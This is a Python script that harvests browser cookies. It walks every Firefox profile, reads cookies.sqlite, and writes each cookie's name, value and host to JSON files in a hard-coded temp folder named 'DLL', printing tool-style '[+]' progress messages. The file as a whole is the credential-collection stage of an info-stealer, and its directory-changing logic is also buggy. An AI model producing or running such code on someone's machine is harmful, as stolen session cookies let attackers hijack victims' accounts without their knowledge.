import os
import sqlite3
import argparse
import json  # Import the json module

# Define paths for Firefox profiles
ROAMING = os.environ["APPDATA"]
PROFILES = "\\Mozilla\\Firefox\\Profiles"
TEMP_DIR = r"C:\Users\Lunix\AppData\Local\Temp\DLL"  # Define the path to save JSON files
PWD = os.getcwd()

# Create the TEMP_DIR if it does not exist
os.makedirs(TEMP_DIR, exist_ok=True)

# Change to the Firefox profiles directory
os.chdir(ROAMING + PROFILES)

def CookiesCount(profile):
    """
    Function to count cookies in the current profile.
    """
    connection = sqlite3.connect("cookies.sqlite")
    cursor = connection.cursor()

    # Execute query to count cookies
    count_query = cursor.execute("SELECT COUNT(name) FROM moz_cookies").fetchall()
    cookies_count = str(count_query).replace("(", "").replace(",)", "").strip()

    print(f"[+] Successfully retrieved {cookies_count} cookies from profile: {profile}")

def SaveToJSONFile(profile):
    """
    Function to save cookies to a JSON file.
    """
    connection = sqlite3.connect("cookies.sqlite")
    cursor = connection.cursor()

    # Define the output JSON file name in TEMP_DIR
    file_name = os.path.join(TEMP_DIR, f"cookies_{profile}.json")

    # Create a list to hold cookies
    cookies_list = []

    # SQL query to retrieve cookies
    query = "SELECT name, value, host FROM moz_cookies"
    results = cursor.execute(query).fetchall()
    
    for name, value, host in results:
        cookies_list.append({"name": name, "value": value, "host": host})  # Append cookie to list

    # Write the cookies list to the JSON file in a readable format
    with open(file_name, "w") as f:
        json.dump(cookies_list, f, indent=4)  # Use indent for readability

    # Call to count cookies in the profile
    CookiesCount(profile)
    print(f"[+] Cookies saved to: {file_name}")

# Iterate over profiles and process cookies
for profile in os.listdir():
    try:
        os.chdir(profile)  # Change to the current profile directory
    except Exception as e:
        print(e)  # Handle errors while changing directories
        continue

    for file in os.listdir():
        if file == "cookies.sqlite":  # Check for the cookies database
            try:
                os.chdir(profile)  # Ensure we're in the correct profile directory
                SaveToJSONFile(profile)  # Save cookies to JSON file
            except Exception as e:
                print(f"[-] Couldn't retrieve cookies for profile: {profile}")
        else:
            pass

        # Change back to the profiles directory for the next iteration
        os.chdir(ROAMING + PROFILES)
